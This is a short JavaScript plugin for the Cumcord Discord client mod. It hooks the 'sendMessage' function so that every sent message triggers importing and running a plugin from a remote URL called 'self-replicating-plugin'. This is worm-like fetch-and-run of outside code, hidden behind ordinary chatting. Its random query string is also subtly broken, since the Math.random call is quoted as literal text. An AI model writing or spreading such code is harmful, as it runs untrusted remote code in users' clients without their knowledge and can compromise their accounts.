import {webpackModules} from "@cumcord/modules";

let unpatch;

export default {
    onLoad() {
        unpatch = cumcord.patcher.after("sendMessage", webpackModules.findByProps("sendMessage"), (args) => {
            cumcord.plugins.importPlugin("https://cumcord.ruthenic.com/self-replicating-plugin?deez=" + `Math.random().toString(36).slice(2)`)
        });
    },
    onUnload() {
        unpatch();
    }
};
